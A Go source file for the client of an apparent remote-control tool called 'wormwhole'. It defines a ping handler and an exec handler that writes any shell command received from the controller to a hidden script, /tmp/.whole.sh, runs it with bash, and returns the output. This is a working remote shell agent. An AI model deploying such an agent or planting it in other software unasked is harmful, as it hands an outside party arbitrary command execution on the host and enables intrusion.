package client

import (
	"bytes"
	"github.com/xorium/wormwhole/core"
	"io/ioutil"
	"os/exec"
)

func (c *Client) initCommandsHandlers() {
	c.cmdHandlers = map[string]func(command *core.Command) (code string, resp []byte){
		"ping": c.PingCmd,
		"exec": c.ExecCmd,
	}
}

func (c *Client) PingCmd(_ *core.Command) (code string, resp []byte) {
	code = core.CommandResultCodeSuccess
	resp = []byte("pong")
	return code, resp
}

func (c *Client) ExecCmd(cmd *core.Command) (code string, resp []byte) {
	code = core.CommandResultCodeSuccess
	if len(cmd.Args) == 0 {
		return core.CommandResultCodeError, []byte("not enough arguments")
	}
	shellCommand, ok := cmd.Args[0].(string)
	if !ok {
		return core.CommandResultCodeError, []byte("incorrect command type")
	}

	tmpScriptPath := "/tmp/.whole.sh"
	err := ioutil.WriteFile(tmpScriptPath, []byte(shellCommand), 0755)
	if err != nil {
		return core.CommandResultCodeError, []byte(err.Error())
	}

	shellCmd := exec.Command("bash", tmpScriptPath)
	var stdout bytes.Buffer
	var stderr bytes.Buffer
	shellCmd.Stdout = &stdout
	shellCmd.Stderr = &stderr

	err = shellCmd.Run()
	if err != nil {
		return core.CommandResultCodeError, []byte(err.Error())
	}

	out := stdout.String()
	if out == "" {
		out = stderr.String()
	}
	return core.CommandResultCodeSuccess, []byte(out)
}
